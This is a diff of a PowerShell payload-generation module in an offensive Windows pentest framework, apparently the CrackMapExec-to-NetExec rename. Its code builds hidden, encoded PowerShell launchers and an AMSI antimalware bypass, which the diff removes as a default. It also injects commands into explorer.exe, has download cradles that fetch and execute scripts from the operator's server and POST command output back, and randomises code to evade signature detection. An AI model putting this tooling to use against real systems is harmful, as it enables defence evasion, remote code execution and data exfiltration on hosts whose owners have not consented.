@@ -1,59 +1,116 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 import os
 import re
 from sys import exit
 from string import ascii_lowercase
 from random import choice, sample
 from subprocess import call
-from cme.helpers.misc import which
-from cme.logger import cme_logger
-from cme.paths import CME_PATH, DATA_PATH
+from nxc.helpers.misc import which
+from nxc.logger import nxc_logger
+from nxc.paths import NXC_PATH, DATA_PATH
 from base64 import b64encode
+import random
 
 obfuscate_ps_scripts = False
 
+def replace_singles(s):
+    """Replaces single quotes with a double quote
+    We do this because quoting is very important in PowerShell, and we are doing multiple layers:
+    Python, MSSQL, and PowerShell. We want to make sure that the command is properly quoted at each layer.
+
+    Args:
+    ----
+        s (str): The string to replace single quotes in.
+
+    Returns:
+    -------
+        str: Original string with single quotes replaced with double.
+    """
+    return s.replace("'", r"\"")
 
 def get_ps_script(path):
+    """Generates a full path to a PowerShell script given a relative path.
+
+    Parameters
+    ----------
+        path (str): The relative path to the PowerShell script.
+
+    Returns
+    -------
+        str: The full path to the PowerShell script.
+    """
     return os.path.join(DATA_PATH, path)
 
 
 def encode_ps_command(command):
+    """
+    Encodes a PowerShell command into a base64-encoded string.
+
+    Args:
+    ----
+        command (str): The PowerShell command to encode.
+
+    Returns:
+    -------
+        str: The base64-encoded string representation of the encoded command.
+    """
     return b64encode(command.encode("UTF-16LE")).decode()
 
 
 def is_powershell_installed():
+    """
+    Check if PowerShell is installed.
+
+    Returns
+    -------
+        bool: True if PowerShell is installed, False otherwise.
+    """
     if which("powershell"):
         return True
     return False
 
 
 def obfs_ps_script(path_to_script):
+    """
+    Obfuscates a PowerShell script.
+
+    Args:
+    ----
+        path_to_script (str): The path to the PowerShell script.
+
+    Returns:
+    -------
+        str: The obfuscated PowerShell script.
+
+    Raises:
+    ------
+        FileNotFoundError: If the script file does not exist.
+        OSError: If there is an error during obfuscation.
+    """
     ps_script = path_to_script.split("/")[-1]
-    obfs_script_dir = os.path.join(CME_PATH, "obfuscated_scripts")
+    obfs_script_dir = os.path.join(NXC_PATH, "obfuscated_scripts")
     obfs_ps_script = os.path.join(obfs_script_dir, ps_script)
 
     if is_powershell_installed() and obfuscate_ps_scripts:
         if os.path.exists(obfs_ps_script):
-            cme_logger.display("Using cached obfuscated Powershell script")
-            with open(obfs_ps_script, "r") as script:
+            nxc_logger.display("Using cached obfuscated Powershell script")
+            with open(obfs_ps_script) as script:
                 return script.read()
 
-        cme_logger.display("Performing one-time script obfuscation, go look at some memes cause this can take a bit...")
+        nxc_logger.display("Performing one-time script obfuscation, go look at some memes cause this can take a bit...")
 
         invoke_obfs_command = f"powershell -C 'Import-Module {get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1')};Invoke-Obfuscation -ScriptPath {get_ps_script(path_to_script)} -Command \"TOKEN,ALL,1,OUT {obfs_ps_script}\" -Quiet'"
-        cme_logger.debug(invoke_obfs_command)
+        nxc_logger.debug(invoke_obfs_command)
 
         with open(os.devnull, "w") as devnull:
-            return_code = call(invoke_obfs_command, stdout=devnull, stderr=devnull, shell=True)
+            call(invoke_obfs_command, stdout=devnull, stderr=devnull, shell=True)
 
-        cme_logger.success("Script obfuscated successfully")
+        nxc_logger.success("Script obfuscated successfully")
 
-        with open(obfs_ps_script, "r") as script:
+        with open(obfs_ps_script) as script:
             return script.read()
 
     else:
-        with open(get_ps_script(path_to_script), "r") as script:
+        with open(get_ps_script(path_to_script)) as script:
             """
             Strip block comments, line comments, empty lines, verbose statements,
             and debug statements from a PowerShell source file.
@@ -61,111 +118,88 @@ def obfs_ps_script(path_to_script):
             # strip block comments
             stripped_code = re.sub(re.compile("<#.*?#>", re.DOTALL), "", script.read())
             # strip blank lines, lines starting with #, and verbose/debug statements
-            stripped_code = "\n".join([line for line in stripped_code.split("\n") if ((line.strip() != "") and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")))])
-
-            return stripped_code
+            return "\n".join([line for line in stripped_code.split("\n") if ((line.strip() != "") and (not line.strip().startswith("#")) and (not line.strip().lower().startswith("write-verbose ")) and (not line.strip().lower().startswith("write-debug ")))])
 
 
-def create_ps_command(ps_command, force_ps32=False, dont_obfs=False, custom_amsi=None):
+
+def create_ps_command(ps_command, force_ps32=False, obfs=False, custom_amsi=None, encode=True):
+    """
+    Generates a PowerShell command based on the provided `ps_command` parameter.
+
+    Args:
+    ----
+        ps_command (str): The PowerShell command to be executed.
+        force_ps32 (bool, optional): Whether to force PowerShell to run in 32-bit mode. Defaults to False.
+        obfs (bool, optional): Whether to obfuscate the generated command. Defaults to False.
+        custom_amsi (str, optional): Path to a custom AMSI bypass script. Defaults to None.
+        encode (bool, optional): Whether to encode the generated command (executed via -enc in PS). Defaults to True.
+
+    Returns:
+    -------
+        str: The generated PowerShell command.
+    """
+    nxc_logger.debug(f"Creating PS command parameters: {ps_command=}, {force_ps32=}, {obfs=}, {custom_amsi=}, {encode=}")
+    
     if custom_amsi:
+        nxc_logger.debug(f"Using custom AMSI bypass script: {custom_amsi}")
         with open(custom_amsi) as file_in:
-            lines = []
-            for line in file_in:
-                lines.append(line)
+            lines = list(file_in)
             amsi_bypass = "".join(lines)
     else:
-        amsi_bypass = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-try{
-[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)
-}catch{}
-"""
+        amsi_bypass = ""
 
-    if force_ps32:
-        command = (
-            amsi_bypass
-            + """
-$functions = {{
-    function Command-ToExecute
-    {{
-{command}
-    }}
-}}
-if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
-{{
-    $job = Start-Job -InitializationScript $functions -ScriptBlock {{Command-ToExecute}} -RunAs32
-    $job | Wait-Job
-}}
-else
-{{
-    IEX "$functions"
-    Command-ToExecute
-}}
-""".format(
-                command=amsi_bypass + ps_command
-            )
-        )
-
+    # for readability purposes, we do not do a one-liner
+    if force_ps32:  # noqa: SIM108
+        # https://stackoverflow.com/a/60155248
+        command = amsi_bypass + f"$functions = {{function Command-ToExecute{{{amsi_bypass + ps_command}}}}}; if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64'){{$job = Start-Job -InitializationScript $functions -ScriptBlock {{Command-ToExecute}} -RunAs32; $job | Wait-Job | Receive-Job }} else {{IEX '$functions'; Command-ToExecute}}"
     else:
-        command = amsi_bypass + ps_command
-
-    cme_logger.debug("Generated PS command:\n {}\n".format(command))
-
-    # We could obfuscate the initial launcher using Invoke-Obfuscation but because this function gets executed
-    # concurrently it would spawn a local powershell process per host which isn't ideal, until I figure out a good way
-    # of dealing with this  it will use the partial python implementation that I stole from GreatSCT
-    # (https://github.com/GreatSCT/GreatSCT) <3
-
-    """
-    if is_powershell_installed():
-
-        temp = tempfile.NamedTemporaryFile(prefix='cme_',
-                                           suffix='.ps1',
-                                           dir='/tmp')
-        temp.write(command)
-        temp.read()
-
-        encoding_types = [1,2,3,4,5,6]
-        while True:
-            encoding = random.choice(encoding_types)
-            invoke_obfs_command = 'powershell -C \'Import-Module {};Invoke-Obfuscation -ScriptPath {} -Command "ENCODING,{}" -Quiet\''.format(get_ps_script('invoke-obfuscation/Invoke-Obfuscation.psd1'),
-                                                                                                                                              temp.name,
-                                                                                                                                              encoding)
-            cme_logger.debug(invoke_obfs_command)
-            out = check_output(invoke_obfs_command, shell=True).split('\n')[4].strip()
-
-            command = 'powershell.exe -exec bypass -noni -nop -w 1 -C "{}"'.format(out)
-            cme_logger.debug('Command length: {}'.format(len(command)))
-
-            if len(command) <= 8192:
-                temp.close()
-                break
-
-            encoding_types.remove(encoding)
+        command = f"{amsi_bypass} {ps_command}"
     
-    else:
-    """
-    if not dont_obfs:
+    nxc_logger.debug(f"Generated PS command:\n {command}\n")
+
+    if obfs:
+        nxc_logger.debug("Obfuscating PowerShell command")
         obfs_attempts = 0
         while True:
-            command = f'powershell.exe -exec bypass -noni -nop -w 1 -C "{invoke_obfuscation(command)}"'
+            nxc_logger.debug(f"Obfuscation attempt: {obfs_attempts + 1}")
+            obfs_command = invoke_obfuscation(command)
+            
+            command = f'powershell.exe -exec bypass -noni -nop -w 1 -C "{replace_singles(obfs_command)}"'
             if len(command) <= 8191:
                 break
-
             if obfs_attempts == 4:
-                cme_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
+                nxc_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
                 exit(1)
-
+            nxc_logger.debug(f"Obfuscation length too long with {len(command)}, trying again...")
             obfs_attempts += 1
     else:
-        command = f"powershell.exe -noni -nop -w 1 -enc {encode_ps_command(command)}"
+        # if we arent encoding or obfuscating anything, we quote the entire powershell in double quotes, otherwise the final powershell command will syntax error
+        command = f"-enc {encode_ps_command(command)}" if encode else f'"{command}"'
+        command = f"powershell.exe -noni -nop -w 1 {command}"
+        
         if len(command) > 8191:
-            cme_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
+            nxc_logger.error(f"Command exceeds maximum length of 8191 chars (was {len(command)}). exiting.")
             exit(1)
-
+            
+    nxc_logger.debug(f"Final command: {command}")
     return command
 
 
 def gen_ps_inject(command, context=None, procname="explorer.exe", inject_once=False):
+    """
+    Generates a PowerShell code block for injecting a command into a specified process.
+
+    Args:
+    ----
+        command (str): The command to be injected.
+        context (str, optional): The context in which the code block will be injected. Defaults to None.
+        procname (str, optional): The name of the process into which the command will be injected. Defaults to "explorer.exe".
+        inject_once (bool, optional): Specifies whether the command should be injected only once. Defaults to False.
+
+    Returns:
+    -------
+        str: The generated PowerShell code block.
+    """
     # The following code gives us some control over where and how Invoke-PSInject does its thang
     # It prioritizes injecting into a process of the active console session
     ps_code = """
@@ -207,8 +241,22 @@ if (($injected -eq $False) -or ($inject_once -eq $False)){{
     return ps_code
 
 
-def gen_ps_iex_cradle(context, scripts, command=str(), post_back=True):
-    if type(scripts) is str:
+def gen_ps_iex_cradle(context, scripts, command="", post_back=True):
+    """
+    Generates a PowerShell IEX cradle script for executing one or more scripts.
+
+    Args:
+    ----
+        context (Context): The context object containing server and port information.
+        scripts (str or list): The script(s) to be executed.
+        command (str, optional): A command to be executed after the scripts are executed. Defaults to an empty string.
+        post_back (bool, optional): Whether to send a POST request with the command. Defaults to True.
+
+    Returns:
+    -------
+        str: The generated PowerShell IEX cradle script.
+    """
+    if isinstance(scripts, str):
         launcher = """
 [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
@@ -222,23 +270,18 @@ IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{ps_scri
             command=command if post_back is False else "",
         ).strip()
 
-    elif type(scripts) is list:
+    elif isinstance(scripts, list):
         launcher = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n"
         launcher += "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'"
         for script in scripts:
-            launcher += "IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{script}')\n".format(
-                server=context.server,
-                port=context.server_port,
-                addr=context.localip,
-                script=script,
-            )
+            launcher += f"IEX (New-Object Net.WebClient).DownloadString('{context.server}://{context.localip}:{context.server_port}/{script}')\n"
         launcher.strip()
         launcher += command if post_back is False else ""
 
     if post_back is True:
-        launcher += """
+        launcher += f"""
 $cmd = {command}
-$request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/')
+$request = [System.Net.WebRequest]::Create('{context.server}://{context.localip}:{context.server_port}/')
 $request.Method = 'POST'
 $request.ContentType = 'application/x-www-form-urlencoded'
 $bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)
@@ -246,44 +289,29 @@ $request.ContentLength = $bytes.Length
 $requestStream = $request.GetRequestStream()
 $requestStream.Write($bytes, 0, $bytes.Length)
 $requestStream.Close()
-$request.GetResponse()""".format(
-            server=context.server,
-            port=context.server_port,
-            addr=context.localip,
-            command=command,
-        )
+$request.GetResponse()"""
 
-    cme_logger.debug(f"Generated PS IEX Launcher:\n {launcher}\n")
+    nxc_logger.debug(f"Generated PS IEX Launcher:\n {launcher}\n")
 
     return launcher.strip()
 
 
 # Following was stolen from https://raw.githubusercontent.com/GreatSCT/GreatSCT/templates/invokeObfuscation.py
 def invoke_obfuscation(script_string):
-    # Add letters a-z with random case to $RandomDelimiters.
-    alphabet = "".join(choice([i.upper(), i]) for i in ascii_lowercase)
+    """
+    Obfuscates a script string and generates an obfuscated payload for execution.
 
-    # Create list of random delimiters called random_delimiters.
-    # Avoid using . * ' " [ ] ( ) etc. as delimiters as these will cause problems in the -Split command syntax.
-    random_delimiters = [
-        "_",
-        "-",
-        ",",
-        "{",
-        "}",
-        "~",
-        "!",
-        "@",
-        "%",
-        "&",
-        "<",
-        ">",
-        ";",
-        ":",
-    ]
+    Args:
+    ----
+        script_string (str): The script string to obfuscate.
 
-    for i in alphabet:
-        random_delimiters.append(i)
+    Returns:
+    -------
+        str: The obfuscated payload for execution.
+    """
+    nxc_logger.debug(f"Command before obfuscation: {script_string}")
+    random_alphabet = "".join(random.choice([i.upper(), i]) for i in ascii_lowercase)
+    random_delimiters = ["_", "-", ",", "{", "}", "~", "!", "@", "%", "&", "<", ">", ";", ":", *list(random_alphabet)]
 
     # Only use a subset of current delimiters to randomize what you see in every iteration of this script's output.
     random_delimiters = [choice(random_delimiters) for _ in range(int(len(random_delimiters) / 4))]
@@ -356,7 +384,7 @@ def invoke_obfuscation(script_string):
     set_ofs_var_back = "".join(choice([i.upper(), i.lower()]) for i in set_ofs_var_back)
 
     # Generate the code that will decrypt and execute the payload and randomly select one.
-    baseScriptArray = [
+    base_script_array = [
         "[" + char_str + "[]" + "]" + choice(["", " "]) + encoded_array,
         "(" + choice(["", " "]) + "'" + delimited_encoded_array + "'." + split + "(" + choice(["", " "]) + "'" + random_delimiters_to_print + "'" + choice(["", " "]) + ")" + choice(["", " "]) + "|" + choice(["", " "]) + for_each_object + choice(["", " "]) + "{" + choice(["", " "]) + "(" + choice(["", " "]) + random_conversion_syntax + ")" + choice(["", " "]) + "}" + choice(["", " "]) + ")",
         "(" + choice(["", " "]) + "'" + delimited_encoded_array + "'" + choice(["", " "]) + random_delimiters_to_print_for_dash_split + choice(["", " "]) + "|" + choice(["", " "]) + for_each_object + choice(["", " "]) + "{" + choice(["", " "]) + "(" + choice(["", " "]) + random_conversion_syntax + ")" + choice(["", " "]) + "}" + choice(["", " "]) + ")",
@@ -364,14 +392,14 @@ def invoke_obfuscation(script_string):
     ]
     # Generate random JOIN syntax for all above options
     new_script_array = [
-        choice(baseScriptArray) + choice(["", " "]) + join + choice(["", " "]) + "''",
-        join + choice(["", " "]) + choice(baseScriptArray),
-        str_join + "(" + choice(["", " "]) + "''" + choice(["", " "]) + "," + choice(["", " "]) + choice(baseScriptArray) + choice(["", " "]) + ")",
-        '"' + choice(["", " "]) + "$(" + choice(["", " "]) + set_ofs_var + choice(["", " "]) + ")" + choice(["", " "]) + '"' + choice(["", " "]) + "+" + choice(["", " "]) + str_str + choice(baseScriptArray) + choice(["", " "]) + "+" + '"' + choice(["", " "]) + "$(" + choice(["", " "]) + set_ofs_var_back + choice(["", " "]) + ")" + choice(["", " "]) + '"',
+        choice(base_script_array) + choice(["", " "]) + join + choice(["", " "]) + "''",
+        join + choice(["", " "]) + choice(base_script_array),
+        str_join + "(" + choice(["", " "]) + "''" + choice(["", " "]) + "," + choice(["", " "]) + choice(base_script_array) + choice(["", " "]) + ")",
+        '"' + choice(["", " "]) + "$(" + choice(["", " "]) + set_ofs_var + choice(["", " "]) + ")" + choice(["", " "]) + '"' + choice(["", " "]) + "+" + choice(["", " "]) + str_str + choice(base_script_array) + choice(["", " "]) + "+" + '"' + choice(["", " "]) + "$(" + choice(["", " "]) + set_ofs_var_back + choice(["", " "]) + ")" + choice(["", " "]) + '"',
     ]
 
     # Randomly select one of the above commands.
-    newScript = choice(new_script_array)
+    new_script = choice(new_script_array)
 
     # Generate random invoke operation syntax
     # Below code block is a copy from Out-ObfuscatedStringCommand.ps1
@@ -383,54 +411,22 @@ def invoke_obfuscation(script_string):
     # but not a silver bullet
     # These methods draw on common environment variable values and PowerShell Automatic Variable
     # values/methods/members/properties/etc.
-    invocationOperator = choice([".", "&"]) + choice(["", " "])
-    invoke_expression_syntax.append(invocationOperator + "( $ShellId[1]+$ShellId[13]+'x')")
-    invoke_expression_syntax.append(invocationOperator + "( $PSHome[" + choice(["4", "21"]) + "]+$PSHOME[" + choice(["30", "34"]) + "]+'x')")
-    invoke_expression_syntax.append(invocationOperator + "( $env:Public[13]+$env:Public[5]+'x')")
-    invoke_expression_syntax.append(invocationOperator + "( $env:ComSpec[4," + choice(["15", "24", "26"]) + ",25]-Join'')")
-    invoke_expression_syntax.append(invocationOperator + "((" + choice(["Get-Variable", "GV", "Variable"]) + " '*mdr*').Name[3,11,2]-Join'')")
-    invoke_expression_syntax.append(invocationOperator + "( " + choice(["$VerbosePreference.ToString()", "([String]$VerbosePreference)"]) + "[1,3]+'x'-Join'')")
+    invocation_operator = choice([".", "&"]) + choice(["", " "])
+    invoke_expression_syntax.extend((invocation_operator + "( $ShellId[1]+$ShellId[13]+'x')", invocation_operator + "( $PSHome[" + choice(["4", "21"]) + "]+$PSHOME[" + choice(["30", "34"]) + "]+'x')", invocation_operator + "( $env:Public[13]+$env:Public[5]+'x')", invocation_operator + "( $env:ComSpec[4," + choice(["15", "24", "26"]) + ",25]-Join'')", invocation_operator + "((" + choice(["Get-Variable", "GV", "Variable"]) + " '*mdr*').Name[3,11,2]-Join'')", invocation_operator + "( " + choice(["$VerbosePreference.ToString()", "([String]$VerbosePreference)"]) + "[1,3]+'x'-Join'')"))
 
     # Randomly choose from above invoke operation syntaxes.
-    invokeExpression = choice(invoke_expression_syntax)
+    invoke_expression = choice(invoke_expression_syntax)
 
     # Randomize the case of selected invoke operation.
-    invokeExpression = "".join(choice([i.upper(), i.lower()]) for i in invokeExpression)
+    invoke_expression = "".join(choice([i.upper(), i.lower()]) for i in invoke_expression)
 
     # Choose random Invoke-Expression/IEX syntax and ordering: IEX ($ScriptString) or ($ScriptString | IEX)
-    invokeOptions = [
-        choice(["", " "]) + invokeExpression + choice(["", " "]) + "(" + choice(["", " "]) + newScript + choice(["", " "]) + ")" + choice(["", " "]),
-        choice(["", " "]) + newScript + choice(["", " "]) + "|" + choice(["", " "]) + invokeExpression,
+    invoke_options = [
+        choice(["", " "]) + invoke_expression + choice(["", " "]) + "(" + choice(["", " "]) + new_script + choice(["", " "]) + ")" + choice(["", " "]),
+        choice(["", " "]) + new_script + choice(["", " "]) + "|" + choice(["", " "]) + invoke_expression,
     ]
 
-    obfuscated_payload = choice(invokeOptions)
+    obfuscated_script = choice(invoke_options)
+    nxc_logger.debug(f"Script after obfuscation: {obfuscated_script}")
+    return obfuscated_script
 
-    """
-    # Array to store all selected PowerShell execution flags.
-    powerShellFlags = []
-
-    noProfile = '-nop'
-    nonInteractive = '-noni'
-    windowStyle = '-w'
-
-    # Build the PowerShell execution flags by randomly selecting execution flags substrings and randomizing the order.
-    # This is to prevent Blue Team from placing false hope in simple signatures for common substrings of these execution flags.
-    commandlineOptions = []
-    commandlineOptions.append(noProfile[0:randrange(4, len(noProfile) + 1, 1)])
-    commandlineOptions.append(nonInteractive[0:randrange(5, len(nonInteractive) + 1, 1)])
-    # Randomly decide to write WindowStyle value with flag substring or integer value.
-    commandlineOptions.append(''.join(windowStyle[0:randrange(2, len(windowStyle) + 1, 1)] + choice([' '*1, ' '*2, ' '*3]) + choice(['1','h','hi','hid','hidd','hidde'])))
-
-    # Randomize the case of all command-line arguments.
-    for count, option in enumerate(commandlineOptions):
-        commandlineOptions[count] = ''.join(choice([i.upper(), i.lower()]) for i in option)
-
-    for count, option in enumerate(commandlineOptions):
-        commandlineOptions[count] = ''.join(option)
-
-    commandlineOptions = sample(commandlineOptions, len(commandlineOptions)) 
-    commandlineOptions = ''.join(i + choice([' '*1, ' '*2, ' '*3]) for i in commandlineOptions)
-
-    obfuscatedPayload = 'powershell.exe ' + commandlineOptions + newScript
-    """
-    return obfuscated_payload
